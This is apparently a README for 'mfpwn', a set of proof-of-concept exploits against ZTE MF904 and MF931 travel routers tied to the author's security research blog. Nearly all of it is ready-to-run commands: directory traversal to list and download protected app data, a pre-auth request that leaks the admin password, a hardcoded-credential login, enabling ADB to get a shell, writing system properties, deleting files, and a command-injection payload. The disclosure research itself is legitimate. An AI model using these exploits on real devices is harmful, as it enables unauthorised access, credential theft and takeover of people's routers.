<p align="center">

  <img src="images/logo.png" width="300">

</p>

A suite of PoC's/exploits/utils for some Android based ZTE travel routers - tested on MF904 (`MF904Q-6.0-1-6735WM_LCD_20240123`) and MF931 (`MF931Q-1.0-1-6735WM-LED-20240301`).

## Blogs 

[[4] Looking at some Newer Models](https://luke-m.xyz/travel_router/p4.md)

## Functionality 

### `enterfold`

Enters a directory and returns a list of the contents (with some info) (uses directory traversal):

```
python3 mfpwn.py -router_ip 192.168.0.1 -admin_pwd admin enterfold /
```

### `download_directory`

Downloads contents of specified directory as `com.android.phone` (using directory traversal), result placed in `./files` respecting original directory structure:

```
python3 mfpwn.py -router_ip 192.168.0.1 -admin_pwd admin download_directory /data/data/com.android.phone
```

### `goform_get`

Makes a request to `http://192.168.0.1/goform/goform_get_cmd_process` (which is accessible pre-auth) to fetch specified value:

```
python3 mfpwn.py -router_ip 192.168.0.1 goform_get "admin_Password"
```

### `sys_prop_get`

Fetches values from `/system/build.prop` with specified ID:

```
python3 mfpwn.py -router_ip 192.168.0.1 sys_prop_get "ro.product.name"
```

### `sys_prop_set`

Sets values in `/system/build.prop` with specified ID:

```
python3 mfpwn.py -router_ip 192.168.0.1 sys_prop_set *key* *value*
```

### `get_file_form`

Makes a request to `http://192.168.0.1/getFileForm` to fetch and print the file:

```
python3 mfpwn.py -router_ip 192.168.0.1 get_file_form /system/build.prop
```

### `enable_adb`

Makes a request to `http://192.168.0.1/adbWifiDebugForm.do` to enable adb over wifi:

```
python3 mfpwn.py -router_ip 192.168.0.1 -admin_pwd admin enable_adb
adb connect 192.168.0.1
adb shell
```

### `get_admin_pwd` 

Abuses a missing authentication check on the `goform_get_cmd_process` tom fetch the admin password of the router pre-auth.

```
python3 mfpwn.py -router_ip 192.168.0.1 get_admin_pwd
```

### `hardcoded_login`

Demonstrates login using discovered hardcoded credentials - result should be there if credentials are present.

```
python3 mfpwn.py -router_ip 192.168.0.1 hardcoded_login
```

### `get_info`

Uses the exposed system property endpoint to fetch useful version information:

```
python3 mfpwn.py -router_ip 192.168.0.1 get_info
```

### `mkdir`

Creates a directory (as `com.android.phone`):

```
python3 mfpwn.py -router_ip 192.168.0.1 mkdir /data/data/com.android.phone/test
```

### `remove`

Removes files (as `com.android.phone`):

```
python3 mfpwn.py -router_ip 192.168.0.1 remove /data/data/com.android.phone test
```

### `ip_port_fileter_injection`

PoC for post-auth command injection in `ADD_IP_PORT_FILETER` handler:

```
python3 mfpwn.py -router_ip 192.168.0.1 ip_port_fileter_injection 'touch /data/local/tmp/pwned'
```